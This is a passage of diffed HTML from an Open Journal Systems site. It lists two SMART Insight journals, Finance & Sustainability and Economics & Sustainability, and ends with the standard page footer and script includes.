+							<img src="http://journals.smartinsight.id/public/journals/30/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/FS" target="_blank" rel="bookmark">
+									Finance & Sustainability
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Finance &amp; Sustainability (FS) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. Finance &amp; Sustainability is published two (2) times in 1 year.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/FS" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/FS/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+										<div class="col-6">
+			<div class="card m-3" style="max-width: 540px;">
+				<div class="row no-gutters">
+					<div class="col-md-4">
+						<a href="http://journals.smartinsight.id/index.php/ES" target="_blank">
+							<img src="http://journals.smartinsight.id/public/journals/24/journalThumbnail_en_US.jpg">
+						</a>
+					</div>
+					<div class="col-md-8">
+						<div class="card-body">
+							<h5 class="card-title">
+								<a href="http://journals.smartinsight.id/index.php/ES" target="_blank" rel="bookmark">
+									Economics & Sustainability
+								</a>
+							</h5>
+														<div class="description">
+								<p class="card-text">
+									<p>Economics &amp; Sustainability (ES) is a scientific publication published by SMART Insight which is under the research institute SMART Indonesia. Sharia Economic Applied Research and Training (SMART) is a research institution in Indonesia that focuses on research on Islamic economics and finance. ES Journal published two (2) times in 1 year.</p>
+								</p>
+							</div>
+														<p class="card-text">
+								<a href="http://journals.smartinsight.id/index.php/ES" target="_blank" class="mr-2"><small>View Journal</small></a>
+								<a href="http://journals.smartinsight.id/index.php/ES/%20%20issue/current" target="_blank">
+									<small>Current Issue</small>
+								</a>
+							</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+					</div>
+
+</div><!-- .page -->
+
+	</div><!-- pkp_structure_main -->
+
+							</div><!-- pkp_structure_content -->
+
+<div class="pkp_structure_footer_wrapper" role="contentinfo">
+	<a id="pkp_content_footer"></a>
+
+	<div class="pkp_structure_footer">
+
+		
+		<div class="pkp_brand_footer" role="complementary">
+			<a href="http://journals.smartinsight.id/index.php/index/about/aboutThisPublishingSystem">
+				<img alt="More information about the publishing system, Platform and Workflow by OJS/PKP." src="http://journals.smartinsight.id/templates/images/ojs_brand.png">
+			</a>
+		</div>
+	</div>
+</div><!-- pkp_structure_footer_wrapper -->
+
+</div><!-- pkp_structure_page -->
+
+
+
+<script src="http://journals.smartinsight.id/lib/pkp/lib/vendor/components/jquery/jquery.min.js?v=3.3.0.8" type="text/javascript"></script><script src="http://journals.smartinsight.id/lib/pkp/lib/vendor/components/jqueryui/jquery-ui.min.js?v=3.3.0.8" type="text/javascript"></script><script src="http://journals.smartinsight.id/plugins/themes/default/js/lib/popper/popper.js?v=3.3.0.8" type="text/javascript"></script><script src="http://journals.smartinsight.id/plugins/themes/default/js/lib/bootstrap/util.js?v=3.3.0.8" type="text/javascript"></script><script src="http://journals.smartinsight.id/plugins/themes/default/js/lib/bootstrap/dropdown.js?v=3.3.0.8" type="text/javascript"></script><script src="http://journals.smartinsight.id/plugins/themes/default/js/main.js?v=3.3.0.8" type="text/javascript"></script>
+
+
+</body>
+
+</html>
